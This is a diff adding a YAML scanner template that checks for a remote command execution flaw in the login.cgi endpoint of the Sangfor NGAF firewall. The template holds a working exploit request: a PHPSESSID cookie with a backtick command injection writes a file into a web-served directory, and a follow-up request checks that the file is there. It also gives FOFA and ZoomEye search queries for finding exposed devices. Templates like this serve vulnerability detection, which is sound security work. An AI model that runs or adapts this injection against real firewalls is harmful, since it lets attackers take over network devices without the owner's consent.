@@ -1,0 +1,36 @@
+id: sangfor-ngaf-login-rce
+
+info:
+  name: 深信服下一代防火墙NGAF login远程命令执行漏洞
+  author: zan8in
+  severity: critical
+  verified: true
+  description: |-
+    深信服下一代防火墙（Next-Generation Application Firewall）NGAF的login.cgi接口对用户传入的参数未进行有效的过滤，攻击者可利用该漏洞获取服务器的权限。
+    FOFA: app="SANGFOR-防火墙类产品"
+    ZoomEye: app:"深信服 防火墙类产品"
+  reference:
+    - https://mp.weixin.qq.com/s/XtNoI3H_EIek4IFK_11DfA
+  tags: sangfor,rce
+  created: 2023/11/01
+
+set:
+  randBody: randomLowercase(32)
+  randName: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /cgi-bin/login.cgi
+      headers:
+        Content-Type: Application/X-www-Form
+        Cookie: PHPSESSID=`$(echo "{{randBody}}"~ > /fwlib/sys/virus/webui/svpn_html/{{randName}}.txt)`;
+      body: |
+        {"opr":"login", "data":{"user": "watchTowr" , "pwd": "watchTowr" , "vericode": "EINW" , "privacy_enable": "0"}}
+    expression: response.status == 200 && response.body.bcontains(b'"success"') && response.body.bcontains(b'"msg"')
+  r1:
+    request:
+      method: GET
+      path: /svpn_html/{{randName}}.txt
+    expression: response.status == 200 && response.body.bcontains(bytes(randBody))
+expression: r0() && r1()
